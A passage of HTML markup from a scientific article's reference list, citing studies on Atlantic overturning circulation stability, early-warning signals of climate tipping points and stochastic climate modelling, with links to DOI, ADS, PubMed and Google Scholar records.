    <a data-track="click" data-track-action="google scholar reference" data-track-label="link" rel="nofollow noopener" aria-label="Google Scholar reference 5" href="http://scholar.google.com/scholar_lookup?&amp;title=Atmospheric%20CO2%20control%20of%20spontaneous%20millennial-scale%20ice%20age%20climate%20oscillations&amp;journal=Nat.%20Geosci.&amp;doi=10.1038%2Fs41561-022-00920-7&amp;volume=15&amp;pages=300-306&amp;publication_year=2022&amp;author=Vettoretti%2CG&amp;author=Ditlevsen%2CP&amp;author=Jochum%2CM&amp;author=Rasmussen%2CSO">
                    Google Scholar</a>&nbsp;
                </p></li><li data-counter="6."><p id="ref-CR6">Ganopolski, A. &amp; Rahmstorf, S. Rapid changes of glacial climate simulated in a coupled climate model. <i>Nature</i> <b>409</b>, 153‚Äì158 (2001).</p><p><a data-track="click" rel="nofollow noopener" data-track-label="10.1038/35051500" data-track-action="article reference" href="https://doi.org/10.1038%2F35051500" aria-label="Article reference 6" data-doi="10.1038/35051500">Article</a>&nbsp;
    <a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="ads reference" href="http://adsabs.harvard.edu/cgi-bin/nph-data_query?link_type=ABSTRACT&amp;bibcode=2001Natur.409..153G" aria-label="ADS reference 6">ADS</a>&nbsp;
    <a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="cas reference" href="https://www.nature.com/articles/cas-redirect/1:CAS:528:DC%2BD3MXlvV2jsw%3D%3D" aria-label="CAS reference 6">CAS</a>&nbsp;
    <a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="pubmed reference" href="http://www.ncbi.nlm.nih.gov/entrez/query.fcgi?cmd=Retrieve&amp;db=PubMed&amp;dopt=Abstract&amp;list_uids=11196631" aria-label="PubMed reference 6">PubMed</a>&nbsp;
    <a data-track="click" data-track-action="google scholar reference" data-track-label="link" rel="nofollow noopener" aria-label="Google Scholar reference 6" href="http://scholar.google.com/scholar_lookup?&amp;title=Rapid%20changes%20of%20glacial%20climate%20simulated%20in%20a%20coupled%20climate%20model&amp;journal=Nature&amp;doi=10.1038%2F35051500&amp;volume=409&amp;pages=153-158&amp;publication_year=2001&amp;author=Ganopolski%2CA&amp;author=Rahmstorf%2CS">
                    Google Scholar</a>&nbsp;
                </p></li><li data-counter="7."><p id="ref-CR7">Wood, R. A., Rodr√≠guez, J. M., Smith, R. S., Jackson, L. C. &amp; Hawkins, E. Observable low-order dynamical controls on thresholds of the Atlantic meridional overturning circulation. <i>Clim. Dyn.</i> <b>53</b>, 6815‚Äì6834 (2019).</p><p><a data-track="click" rel="nofollow noopener" data-track-label="10.1007/s00382-019-04956-1" data-track-action="article reference" href="https://doi.org/10.1007%2Fs00382-019-04956-1" aria-label="Article reference 7" data-doi="10.1007/s00382-019-04956-1">Article</a>&nbsp;
    <a data-track="click" data-track-action="google scholar reference" data-track-label="link" rel="nofollow noopener" aria-label="Google Scholar reference 7" href="http://scholar.google.com/scholar_lookup?&amp;title=Observable%20low-order%20dynamical%20controls%20on%20thresholds%20of%20the%20Atlantic%20meridional%20overturning%20circulation&amp;journal=Clim.%20Dyn.&amp;doi=10.1007%2Fs00382-019-04956-1&amp;volume=53&amp;pages=6815-6834&amp;publication_year=2019&amp;author=Wood%2CRA&amp;author=Rodr%C3%ADguez%2CJM&amp;author=Smith%2CRS&amp;author=Jackson%2CLC&amp;author=Hawkins%2CE">
                    Google Scholar</a>&nbsp;
                </p></li><li data-counter="8."><p id="ref-CR8">Hawkins, E. et al. Bistability of the Atlantic overturning circulation in a global climate model and links to ocean freshwater transport. <i>Geophys. Res. Lett.</i> <b>38</b>, L10605 (2011).</p></li><li data-counter="9."><p id="ref-CR9">Weijer, W. et al. Stability of the Atlantic meridional overturning circulation: a review and synthesis. <i>J. Geophys. Res. Oceans</i> <b>124</b>, 5336‚Äì5375 (2019).</p><p><a data-track="click" rel="nofollow noopener" data-track-label="10.1029/2019JC015083" data-track-action="article reference" href="https://doi.org/10.1029%2F2019JC015083" aria-label="Article reference 9" data-doi="10.1029/2019JC015083">Article</a>&nbsp;
    <a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="ads reference" href="http://adsabs.harvard.edu/cgi-bin/nph-data_query?link_type=ABSTRACT&amp;bibcode=2019JGRC..124.5336W" aria-label="ADS reference 9">ADS</a>&nbsp;
    <a data-track="click" data-track-action="google scholar reference" data-track-label="link" rel="nofollow noopener" aria-label="Google Scholar reference 9" href="http://scholar.google.com/scholar_lookup?&amp;title=Stability%20of%20the%20Atlantic%20meridional%20overturning%20circulation%3A%20a%20review%20and%20synthesis&amp;journal=J.%20Geophys.%20Res.%20Oceans&amp;doi=10.1029%2F2019JC015083&amp;volume=124&amp;pages=5336-5375&amp;publication_year=2019&amp;author=Weijer%2CW">
                    Google Scholar</a>&nbsp;
                </p></li><li data-counter="10."><p id="ref-CR10">Mecking, J., Drijfhout, S., Jackson, L. &amp; Andrews, M. The effect of model bias on Atlantic freshwater transport and implications for AMOC bi-stability. <i>Tellus A: Dyn. Meteorol. Oceanogr.</i> <b>69</b>, 1299910 (2017).</p><p><a data-track="click" rel="nofollow noopener" data-track-label="10.1080/16000870.2017.1299910" data-track-action="article reference" href="https://doi.org/10.1080%2F16000870.2017.1299910" aria-label="Article reference 10" data-doi="10.1080/16000870.2017.1299910">Article</a>&nbsp;
    <a data-track="click" data-track-action="google scholar reference" data-track-label="link" rel="nofollow noopener" aria-label="Google Scholar reference 10" href="http://scholar.google.com/scholar_lookup?&amp;title=The%20effect%20of%20model%20bias%20on%20Atlantic%20freshwater%20transport%20and%20implications%20for%20AMOC%20bi-stability&amp;journal=Tellus%20A%3A%20Dyn.%20Meteorol.%20Oceanogr.&amp;doi=10.1080%2F16000870.2017.1299910&amp;volume=69&amp;publication_year=2017&amp;author=Mecking%2CJ&amp;author=Drijfhout%2CS&amp;author=Jackson%2CL&amp;author=Andrews%2CM">
                    Google Scholar</a>&nbsp;
                </p></li><li data-counter="11."><p id="ref-CR11">Rahmstorf, S. et al. Exceptional twentieth-century slowdown in Atlantic Ocean overturning circulation. <i>Nat. Clim. Change</i> <b>5</b>, 475‚Äì480 (2015).</p><p><a data-track="click" rel="nofollow noopener" data-track-label="10.1038/nclimate2554" data-track-action="article reference" href="https://doi.org/10.1038%2Fnclimate2554" aria-label="Article reference 11" data-doi="10.1038/nclimate2554">Article</a>&nbsp;
    <a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="ads reference" href="http://adsabs.harvard.edu/cgi-bin/nph-data_query?link_type=ABSTRACT&amp;bibcode=2015NatCC...5..475R" aria-label="ADS reference 11">ADS</a>&nbsp;
    <a data-track="click" data-track-action="google scholar reference" data-track-label="link" rel="nofollow noopener" aria-label="Google Scholar reference 11" href="http://scholar.google.com/scholar_lookup?&amp;title=Exceptional%20twentieth-century%20slowdown%20in%20Atlantic%20Ocean%20overturning%20circulation&amp;journal=Nat.%20Clim.%20Change&amp;doi=10.1038%2Fnclimate2554&amp;volume=5&amp;pages=475-480&amp;publication_year=2015&amp;author=Rahmstorf%2CS">
                    Google Scholar</a>&nbsp;
                </p></li><li data-counter="12."><p id="ref-CR12">Masson-Delmotte, V. et al. <i>IPCC, 2021: Climate Change 2021: The Physical Science Basis</i>. Contribution of Working Group I to the Sixth Assessment Report of the Intergovernmental Panel on Climate Change (Cambridge University Press, 2021).</p></li><li data-counter="13."><p id="ref-CR13">Gong, X., Liu, H., Wang, F. &amp; Heuz√©, C. Of Atlantic meridional overturning circulation in the CMIP6 project. <i>Deep Sea Res. Part II: Top. Stud. Oceanogr.</i> <b>206</b>, 105193 (2022).</p><p><a data-track="click" rel="nofollow noopener" data-track-label="10.1016/j.dsr2.2022.105193" data-track-action="article reference" href="https://doi.org/10.1016%2Fj.dsr2.2022.105193" aria-label="Article reference 13" data-doi="10.1016/j.dsr2.2022.105193">Article</a>&nbsp;
    <a data-track="click" data-track-action="google scholar reference" data-track-label="link" rel="nofollow noopener" aria-label="Google Scholar reference 13" href="http://scholar.google.com/scholar_lookup?&amp;title=Of%20Atlantic%20meridional%20overturning%20circulation%20in%20the%20CMIP6%20project&amp;journal=Deep%20Sea%20Res.%20Part%20II%3A%20Top.%20Stud.%20Oceanogr.&amp;doi=10.1016%2Fj.dsr2.2022.105193&amp;volume=206&amp;publication_year=2022&amp;author=Gong%2CX&amp;author=Liu%2CH&amp;author=Wang%2CF&amp;author=Heuz%C3%A9%2CC">
                    Google Scholar</a>&nbsp;
                </p></li><li data-counter="14."><p id="ref-CR14">Hofmann, M. &amp; Rahmstorf, S. On the stability of the Atlantic meridional overturning circulation. <i>Proc. Natl Acad. Sci. USA</i> <b>106</b>, 20584‚Äì20589 (2009).</p><p><a data-track="click" rel="nofollow noopener" data-track-label="10.1073/pnas.0909146106" data-track-action="article reference" href="https://doi.org/10.1073%2Fpnas.0909146106" aria-label="Article reference 14" data-doi="10.1073/pnas.0909146106">Article</a>&nbsp;
    <a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="ads reference" href="http://adsabs.harvard.edu/cgi-bin/nph-data_query?link_type=ABSTRACT&amp;bibcode=2009PNAS..10620584H" aria-label="ADS reference 14">ADS</a>&nbsp;
    <a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="cas reference" href="https://www.nature.com/articles/cas-redirect/1:CAS:528:DC%2BC3cXksFOhug%3D%3D" aria-label="CAS reference 14">CAS</a>&nbsp;
    <a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="pubmed reference" href="http://www.ncbi.nlm.nih.gov/entrez/query.fcgi?cmd=Retrieve&amp;db=PubMed&amp;dopt=Abstract&amp;list_uids=19897722" aria-label="PubMed reference 14">PubMed</a>&nbsp;
    <a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="pubmed central reference" href="http://www.ncbi.nlm.nih.gov/pmc/articles/PMC2791639" aria-label="PubMed Central reference 14">PubMed Central</a>&nbsp;
    <a data-track="click" data-track-action="google scholar reference" data-track-label="link" rel="nofollow noopener" aria-label="Google Scholar reference 14" href="http://scholar.google.com/scholar_lookup?&amp;title=On%20the%20stability%20of%20the%20Atlantic%20meridional%20overturning%20circulation&amp;journal=Proc.%20Natl%20Acad.%20Sci.%20USA&amp;doi=10.1073%2Fpnas.0909146106&amp;volume=106&amp;pages=20584-20589&amp;publication_year=2009&amp;author=Hofmann%2CM&amp;author=Rahmstorf%2CS">
                    Google Scholar</a>&nbsp;
                </p></li><li data-counter="15."><p id="ref-CR15">Heuz√©, C. North Atlantic deep water formation and AMOC in CMIP5 models. <i>Ocean Sci.</i> <b>13</b>, 609‚Äì622 (2017).</p><p><a data-track="click" rel="nofollow noopener" data-track-label="10.5194/os-13-609-2017" data-track-action="article reference" href="https://doi.org/10.5194%2Fos-13-609-2017" aria-label="Article reference 15" data-doi="10.5194/os-13-609-2017">Article</a>&nbsp;
    <a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="ads reference" href="http://adsabs.harvard.edu/cgi-bin/nph-data_query?link_type=ABSTRACT&amp;bibcode=2017OcSci..13..609H" aria-label="ADS reference 15">ADS</a>&nbsp;
    <a data-track="click" data-track-action="google scholar reference" data-track-label="link" rel="nofollow noopener" aria-label="Google Scholar reference 15" href="http://scholar.google.com/scholar_lookup?&amp;title=North%20Atlantic%20deep%20water%20formation%20and%20AMOC%20in%20CMIP5%20models&amp;journal=Ocean%20Sci.&amp;doi=10.5194%2Fos-13-609-2017&amp;volume=13&amp;pages=609-622&amp;publication_year=2017&amp;author=Heuz%C3%A9%2CC">
                    Google Scholar</a>&nbsp;
                </p></li><li data-counter="16."><p id="ref-CR16">Liu, W., Xie, S.-P., Liu, Z. &amp; Zhu, J. Overlooked possibility of a collapsed Atlantic meridional overturning circulation in warming climate. <i>Sci. Adv.</i> <b>3</b>, e1601666 (2017).</p><p><a data-track="click" rel="nofollow noopener" data-track-label="10.1126/sciadv.1601666" data-track-action="article reference" href="https://doi.org/10.1126%2Fsciadv.1601666" aria-label="Article reference 16" data-doi="10.1126/sciadv.1601666">Article</a>&nbsp;
    <a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="ads reference" href="http://adsabs.harvard.edu/cgi-bin/nph-data_query?link_type=ABSTRACT&amp;bibcode=2017SciA....3E1666L" aria-label="ADS reference 16">ADS</a>&nbsp;
    <a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="pubmed reference" href="http://www.ncbi.nlm.nih.gov/entrez/query.fcgi?cmd=Retrieve&amp;db=PubMed&amp;dopt=Abstract&amp;list_uids=28070560" aria-label="PubMed reference 16">PubMed</a>&nbsp;
    <a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="pubmed central reference" href="http://www.ncbi.nlm.nih.gov/pmc/articles/PMC5217057" aria-label="PubMed Central reference 16">PubMed Central</a>&nbsp;
    <a data-track="click" data-track-action="google scholar reference" data-track-label="link" rel="nofollow noopener" aria-label="Google Scholar reference 16" href="http://scholar.google.com/scholar_lookup?&amp;title=Overlooked%20possibility%20of%20a%20collapsed%20Atlantic%20meridional%20overturning%20circulation%20in%20warming%20climate&amp;journal=Sci.%20Adv.&amp;doi=10.1126%2Fsciadv.1601666&amp;volume=3&amp;publication_year=2017&amp;author=Liu%2CW&amp;author=Xie%2CS-P&amp;author=Liu%2CZ&amp;author=Zhu%2CJ">
                    Google Scholar</a>&nbsp;
                </p></li><li data-counter="17."><p id="ref-CR17">Guckenheimer, J. &amp; Holmes, P. <i>Nonlinear Oscillations, Dynamical Systems, and Bifurcations of Vector Fields</i> (Springer, 1986).</p></li><li data-counter="18."><p id="ref-CR18">Kubo, R. The fluctuation-dissipation theorem. <i>Rep. Prog. Phys.</i> <b>29</b>, 255‚Äì284 (1966).</p></li><li data-counter="19."><p id="ref-CR19">Ditlevsen, P. D. &amp; Johnsen, S. Tipping points: early warning and wishful thinking. <i>Geophys. Res. Lett.</i> <b>37</b>, L19703 (2010).</p><p><a data-track="click" rel="nofollow noopener" data-track-label="10.1029/2010GL044486" data-track-action="article reference" href="https://doi.org/10.1029%2F2010GL044486" aria-label="Article reference 19" data-doi="10.1029/2010GL044486">Article</a>&nbsp;
    <a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="ads reference" href="http://adsabs.harvard.edu/cgi-bin/nph-data_query?link_type=ABSTRACT&amp;bibcode=2010GeoRL..3719703D" aria-label="ADS reference 19">ADS</a>&nbsp;
    <a data-track="click" data-track-action="google scholar reference" data-track-label="link" rel="nofollow noopener" aria-label="Google Scholar reference 19" href="http://scholar.google.com/scholar_lookup?&amp;title=Tipping%20points%3A%20early%20warning%20and%20wishful%20thinking&amp;journal=Geophys.%20Res.%20Lett.&amp;doi=10.1029%2F2010GL044486&amp;volume=37&amp;publication_year=2010&amp;author=Ditlevsen%2CPD&amp;author=Johnsen%2CS">
                    Google Scholar</a>&nbsp;
                </p></li><li data-counter="20."><p id="ref-CR20">Boulton, C., Allison, L. &amp; Lenton, T. Early warning signals of Atlantic meridional overturning circulation collapse in a fully coupled climate model. <i>Nat. Commun.</i> <b>5</b>, 5752 (2014).</p><p><a data-track="click" rel="nofollow noopener" data-track-label="10.1038/ncomms6752" data-track-action="article reference" href="https://doi.org/10.1038%2Fncomms6752" aria-label="Article reference 20" data-doi="10.1038/ncomms6752">Article</a>&nbsp;
    <a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="ads reference" href="http://adsabs.harvard.edu/cgi-bin/nph-data_query?link_type=ABSTRACT&amp;bibcode=2014NatCo...5.5752B" aria-label="ADS reference 20">ADS</a>&nbsp;
    <a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="cas reference" href="https://www.nature.com/articles/cas-redirect/1:CAS:528:DC%2BC2MXktFensbk%3D" aria-label="CAS reference 20">CAS</a>&nbsp;
    <a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="pubmed reference" href="http://www.ncbi.nlm.nih.gov/entrez/query.fcgi?cmd=Retrieve&amp;db=PubMed&amp;dopt=Abstract&amp;list_uids=25482065" aria-label="PubMed reference 20">PubMed</a>&nbsp;
    <a data-track="click" data-track-action="google scholar reference" data-track-label="link" rel="nofollow noopener" aria-label="Google Scholar reference 20" href="http://scholar.google.com/scholar_lookup?&amp;title=Early%20warning%20signals%20of%20Atlantic%20meridional%20overturning%20circulation%20collapse%20in%20a%20fully%20coupled%20climate%20model&amp;journal=Nat.%20Commun.&amp;doi=10.1038%2Fncomms6752&amp;volume=5&amp;publication_year=2014&amp;author=Boulton%2CC&amp;author=Allison%2CL&amp;author=Lenton%2CT">
                    Google Scholar</a>&nbsp;
                </p></li><li data-counter="21."><p id="ref-CR21">Scheffer, M. et al. Early-warning signals for critical transitions. <i>Nature</i> <b>461</b>, 53‚Äì59 (2009).</p><p><a data-track="click" rel="nofollow noopener" data-track-label="10.1038/nature08227" data-track-action="article reference" href="https://doi.org/10.1038%2Fnature08227" aria-label="Article reference 21" data-doi="10.1038/nature08227">Article</a>&nbsp;
    <a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="ads reference" href="http://adsabs.harvard.edu/cgi-bin/nph-data_query?link_type=ABSTRACT&amp;bibcode=2009Natur.461...53S" aria-label="ADS reference 21">ADS</a>&nbsp;
    <a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="cas reference" href="https://www.nature.com/articles/cas-redirect/1:CAS:528:DC%2BD1MXhtVygsbjI" aria-label="CAS reference 21">CAS</a>&nbsp;
    <a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="pubmed reference" href="http://www.ncbi.nlm.nih.gov/entrez/query.fcgi?cmd=Retrieve&amp;db=PubMed&amp;dopt=Abstract&amp;list_uids=19727193" aria-label="PubMed reference 21">PubMed</a>&nbsp;
    <a data-track="click" data-track-action="google scholar reference" data-track-label="link" rel="nofollow noopener" aria-label="Google Scholar reference 21" href="http://scholar.google.com/scholar_lookup?&amp;title=Early-warning%20signals%20for%20critical%20transitions&amp;journal=Nature&amp;doi=10.1038%2Fnature08227&amp;volume=461&amp;pages=53-59&amp;publication_year=2009&amp;author=Scheffer%2CM">
                    Google Scholar</a>&nbsp;
                </p></li><li data-counter="22."><p id="ref-CR22">Smeed, D. A. et al. Observed decline of the Atlantic meridional overturning circulation 2004-2012. <i>Ocean Sci.</i> <b>10</b>, 29‚Äì38 (2014).</p><p><a data-track="click" rel="nofollow noopener" data-track-label="10.5194/os-10-29-2014" data-track-action="article reference" href="https://doi.org/10.5194%2Fos-10-29-2014" aria-label="Article reference 22" data-doi="10.5194/os-10-29-2014">Article</a>&nbsp;
    <a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="ads reference" href="http://adsabs.harvard.edu/cgi-bin/nph-data_query?link_type=ABSTRACT&amp;bibcode=2014OcSci..10...29S" aria-label="ADS reference 22">ADS</a>&nbsp;
    <a data-track="click" data-track-action="google scholar reference" data-track-label="link" rel="nofollow noopener" aria-label="Google Scholar reference 22" href="http://scholar.google.com/scholar_lookup?&amp;title=Observed%20decline%20of%20the%20Atlantic%20meridional%20overturning%20circulation%202004-2012&amp;journal=Ocean%20Sci.&amp;doi=10.5194%2Fos-10-29-2014&amp;volume=10&amp;pages=29-38&amp;publication_year=2014&amp;author=Smeed%2CDA">
                    Google Scholar</a>&nbsp;
                </p></li><li data-counter="23."><p id="ref-CR23">Caesar, L., Rahmstorf, S., Robinson, A., Feulner, G. &amp; Saba, V. Observed fingerprint of a weakening Atlantic ocean overturning circulation. <i>Nature</i> <b>552</b>, 191‚Äì196 (2018).</p><p><a data-track="click" rel="nofollow noopener" data-track-label="10.1038/s41586-018-0006-5" data-track-action="article reference" href="https://doi.org/10.1038%2Fs41586-018-0006-5" aria-label="Article reference 23" data-doi="10.1038/s41586-018-0006-5">Article</a>&nbsp;
    <a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="ads reference" href="http://adsabs.harvard.edu/cgi-bin/nph-data_query?link_type=ABSTRACT&amp;bibcode=2018Natur.556..191C" aria-label="ADS reference 23">ADS</a>&nbsp;
    <a data-track="click" data-track-action="google scholar reference" data-track-label="link" rel="nofollow noopener" aria-label="Google Scholar reference 23" href="http://scholar.google.com/scholar_lookup?&amp;title=Observed%20fingerprint%20of%20a%20weakening%20Atlantic%20ocean%20overturning%20circulation&amp;journal=Nature&amp;doi=10.1038%2Fs41586-018-0006-5&amp;volume=552&amp;pages=191-196&amp;publication_year=2018&amp;author=Caesar%2CL&amp;author=Rahmstorf%2CS&amp;author=Robinson%2CA&amp;author=Feulner%2CG&amp;author=Saba%2CV">
                    Google Scholar</a>&nbsp;
                </p></li><li data-counter="24."><p id="ref-CR24">Jackson, L. C. &amp; Wood, R. A. Fingerprints for early detection of changes in the AMOC. <i>J. Clim.</i> <b>33</b>, 7027 ‚Äì 7044 (2020).</p><p><a data-track="click" rel="nofollow noopener" data-track-label="10.1175/JCLI-D-20-0034.1" data-track-action="article reference" href="https://doi.org/10.1175%2FJCLI-D-20-0034.1" aria-label="Article reference 24" data-doi="10.1175/JCLI-D-20-0034.1">Article</a>&nbsp;
    <a data-track="click" data-track-action="google scholar reference" data-track-label="link" rel="nofollow noopener" aria-label="Google Scholar reference 24" href="http://scholar.google.com/scholar_lookup?&amp;title=Fingerprints%20for%20early%20detection%20of%20changes%20in%20the%20AMOC&amp;journal=J.%20Clim.&amp;doi=10.1175%2FJCLI-D-20-0034.1&amp;volume=33&amp;publication_year=2020&amp;author=Jackson%2CLC&amp;author=Wood%2CRA">
                    Google Scholar</a>&nbsp;
                </p></li><li data-counter="25."><p id="ref-CR25">Latif, M. Reconstructing, monitoring, and predicting multidecadal-scale changes in the North Atlantic thermohaline circulation with sea surface temperature. <i>J. Clim.</i> <b>17</b>, 1605‚Äì1614 (2004).</p><p><a data-track="click" rel="nofollow noopener" data-track-label="10.1175/1520-0442(2004)017<1605:RMAPMC>2.0.CO;2" data-track-action="article reference" href="https://doi.org/10.1175%2F1520-0442%282004%29017%3C1605%3ARMAPMC%3E2.0.CO%3B2" aria-label="Article reference 25" data-doi="10.1175/1520-0442(2004)017<1605:RMAPMC>2.0.CO;2">Article</a>&nbsp;
    <a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="ads reference" href="http://adsabs.harvard.edu/cgi-bin/nph-data_query?link_type=ABSTRACT&amp;bibcode=2004JCli...17.1605L" aria-label="ADS reference 25">ADS</a>&nbsp;
    <a data-track="click" data-track-action="google scholar reference" data-track-label="link" rel="nofollow noopener" aria-label="Google Scholar reference 25" href="http://scholar.google.com/scholar_lookup?&amp;title=Reconstructing%2C%20monitoring%2C%20and%20predicting%20multidecadal-scale%20changes%20in%20the%20North%20Atlantic%20thermohaline%20circulation%20with%20sea%20surface%20temperature&amp;journal=J.%20Clim.&amp;doi=10.1175%2F1520-0442%282004%29017%3C1605%3ARMAPMC%3E2.0.CO%3B2&amp;volume=17&amp;pages=1605-1614&amp;publication_year=2004&amp;author=Latif%2CM">
                    Google Scholar</a>&nbsp;
                </p></li><li data-counter="26."><p id="ref-CR26">Rayner, N. A. et al. Global analyses of sea surface temperature, sea ice, and night marine air temperature since the late nineteenth century. <i>J. Geophys. Res.</i> <b>108</b>, 4407 (2003).</p><p><a data-track="click" rel="nofollow noopener" data-track-label="10.1029/2002JD002670" data-track-action="article reference" href="https://doi.org/10.1029%2F2002JD002670" aria-label="Article reference 26" data-doi="10.1029/2002JD002670">Article</a>&nbsp;
    <a data-track="click" data-track-action="google scholar reference" data-track-label="link" rel="nofollow noopener" aria-label="Google Scholar reference 26" href="http://scholar.google.com/scholar_lookup?&amp;title=Global%20analyses%20of%20sea%20surface%20temperature%2C%20sea%20ice%2C%20and%20night%20marine%20air%20temperature%20since%20the%20late%20nineteenth%20century&amp;journal=J.%20Geophys.%20Res.&amp;doi=10.1029%2F2002JD002670&amp;volume=108&amp;publication_year=2003&amp;author=Rayner%2CNA">
                    Google Scholar</a>&nbsp;
                </p></li><li data-counter="27."><p id="ref-CR27">Boers, N. Observation-based early-warning signals for a collapse of the Atlantic meridional overturning circulation. <i>Nat. Clim. Change</i> <b>11</b>, 680‚Äì688 (2021).</p><p><a data-track="click" rel="nofollow noopener" data-track-label="10.1038/s41558-021-01097-4" data-track-action="article reference" href="https://doi.org/10.1038%2Fs41558-021-01097-4" aria-label="Article reference 27" data-doi="10.1038/s41558-021-01097-4">Article</a>&nbsp;
    <a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="ads reference" href="http://adsabs.harvard.edu/cgi-bin/nph-data_query?link_type=ABSTRACT&amp;bibcode=2021NatCC..11..680B" aria-label="ADS reference 27">ADS</a>&nbsp;
    <a data-track="click" data-track-action="google scholar reference" data-track-label="link" rel="nofollow noopener" aria-label="Google Scholar reference 27" href="http://scholar.google.com/scholar_lookup?&amp;title=Observation-based%20early-warning%20signals%20for%20a%20collapse%20of%20the%20Atlantic%20meridional%20overturning%20circulation&amp;journal=Nat.%20Clim.%20Change&amp;doi=10.1038%2Fs41558-021-01097-4&amp;volume=11&amp;pages=680-688&amp;publication_year=2021&amp;author=Boers%2CN">
                    Google Scholar</a>&nbsp;
                </p></li><li data-counter="28."><p id="ref-CR28">Yang, Q. et al. Recent increases in Arctic freshwater flux affects Labrador Sea convection and Atlantic overturning circulation. <i>Nat. Commun.</i> <b>7</b>, 10525 (2016).</p><p><a data-track="click" rel="nofollow noopener" data-track-label="10.1038/ncomms10525" data-track-action="article reference" href="https://doi.org/10.1038%2Fncomms10525" aria-label="Article reference 28" data-doi="10.1038/ncomms10525">Article</a>&nbsp;
    <a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="ads reference" href="http://adsabs.harvard.edu/cgi-bin/nph-data_query?link_type=ABSTRACT&amp;bibcode=2016NatCo...710525Y" aria-label="ADS reference 28">ADS</a>&nbsp;
    <a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="cas reference" href="https://www.nature.com/articles/cas-redirect/1:CAS:528:DC%2BC28Xht1Crsro%3D" aria-label="CAS reference 28">CAS</a>&nbsp;
    <a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="pubmed reference" href="http://www.ncbi.nlm.nih.gov/entrez/query.fcgi?cmd=Retrieve&amp;db=PubMed&amp;dopt=Abstract&amp;list_uids=26796579" aria-label="PubMed reference 28">PubMed</a>&nbsp;
    <a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="pubmed central reference" href="http://www.ncbi.nlm.nih.gov/pmc/articles/PMC4736158" aria-label="PubMed Central reference 28">PubMed Central</a>&nbsp;
    <a data-track="click" data-track-action="google scholar reference" data-track-label="link" rel="nofollow noopener" aria-label="Google Scholar reference 28" href="http://scholar.google.com/scholar_lookup?&amp;title=Recent%20increases%20in%20Arctic%20freshwater%20flux%20affects%20Labrador%20Sea%20convection%20and%20Atlantic%20overturning%20circulation&amp;journal=Nat.%20Commun.&amp;doi=10.1038%2Fncomms10525&amp;volume=7&amp;publication_year=2016&amp;author=Yang%2CQ">
                    Google Scholar</a>&nbsp;
                </p></li><li data-counter="29."><p id="ref-CR29">Keeling, C. D. et al. Atmospheric CO<sub>2</sub> and <sup>13</sup>CO<sub>2</sub> exchange with the terrestrial biosphere and oceans from 1978 to 2000: observations and carbon cycle implications. <i>A History of Atmospheric CO</i><sub><i>2</i></sub> <i>and Its Effects on Plants, Animals, and Ecosystems</i> (eds Ehleringer, J. R. et al.) (Springer, 2005).</p></li><li data-counter="30."><p id="ref-CR30">Hasselmann, K. Stochastic climate models. <i>Tellus</i> <b>28</b>, 473‚Äì485 (1976).</p><p><a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="ads reference" href="http://adsabs.harvard.edu/cgi-bin/nph-data_query?link_type=ABSTRACT&amp;bibcode=1976Tell...28..473H" aria-label="ADS reference 30">ADS</a>&nbsp;
    <a data-track="click" data-track-action="google scholar reference" data-track-label="link" rel="nofollow noopener" aria-label="Google Scholar reference 30" href="http://scholar.google.com/scholar_lookup?&amp;title=Stochastic%20climate%20models&amp;journal=Tellus&amp;volume=28&amp;pages=473-485&amp;publication_year=1976&amp;author=Hasselmann%2CK">
                    Google Scholar</a>&nbsp;
                </p></li><li data-counter="31."><p id="ref-CR31">Ditlevsen, S., Cencerrado Rubio, A. &amp; Lansky, P. Transient dynamics of Pearson diffusions facilitates estimation of rate parameters. <i>Commun. Nonlinear Sci. Numer. Simul.</i> <b>82</b>, 105034 (2020).</p><p><a data-track="click" rel="nofollow noopener" data-track-label="10.1016/j.cnsns.2019.105034" data-track-action="article reference" href="https://doi.org/10.1016%2Fj.cnsns.2019.105034" aria-label="Article reference 31" data-doi="10.1016/j.cnsns.2019.105034">Article</a>&nbsp;
    <a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="mathscinet reference" href="http://www.ams.org/mathscinet-getitem?mr=4019857" aria-label="MathSciNet reference 31">MathSciNet</a>&nbsp;
    <a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="math reference" href="http://www.emis.de/MATH-item?1453.60137" aria-label="MATH reference 31">MATH</a>&nbsp;
    <a data-track="click" data-track-action="google scholar reference" data-track-label="link" rel="nofollow noopener" aria-label="Google Scholar reference 31" href="http://scholar.google.com/scholar_lookup?&amp;title=Transient%20dynamics%20of%20Pearson%20diffusions%20facilitates%20estimation%20of%20rate%20parameters&amp;journal=Commun.%20Nonlinear%20Sci.%20Numer.%20Simul.&amp;doi=10.1016%2Fj.cnsns.2019.105034&amp;volume=82&amp;publication_year=2020&amp;author=Ditlevsen%2CS&amp;author=Cencerrado%20Rubio%2CA&amp;author=Lansky%2CP">
                    Google Scholar</a>&nbsp;
